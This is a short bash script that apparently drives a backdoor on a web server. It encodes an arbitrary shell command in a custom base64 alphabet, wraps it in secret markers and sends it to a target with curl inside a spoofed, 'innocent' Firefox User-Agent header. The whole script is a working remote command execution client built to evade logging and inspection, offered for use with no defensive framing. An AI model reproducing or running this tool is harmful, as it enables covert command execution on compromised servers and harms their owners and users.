#!/bin/bash
usage() {
    echo -e "Usage:\texport XTRIP_MARKER='...'\n\t$0 COMMAND TARGET"
}

if [ $# -eq 0 ] || [ -z "$XTRIP_MARKER" ]; then
    usage
    exit 1
fi

# - Add trailing space because base64 decoder reads bytes by pairs
# - Encode in base64
# - Remove trailing equal signs
# - Translate to custom base64 charset
payload="$(echo -n "$1 " | base64 -w0 | sed 's/=*$//g' | tr 'A-Za-z+/' 'a-zA-Z_-')"
shift

# Surround by markers
complete_payload="$XTRIP_MARKER$payload${XTRIP_MARKER}"

if [ $# -eq 0 ]; then
    echo "$complete_payload"
    exit 1
fi

# Add innocent user-agent
user_agent="Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0"
curl -skA"$complete_payload$user_agent" $@ >/dev/null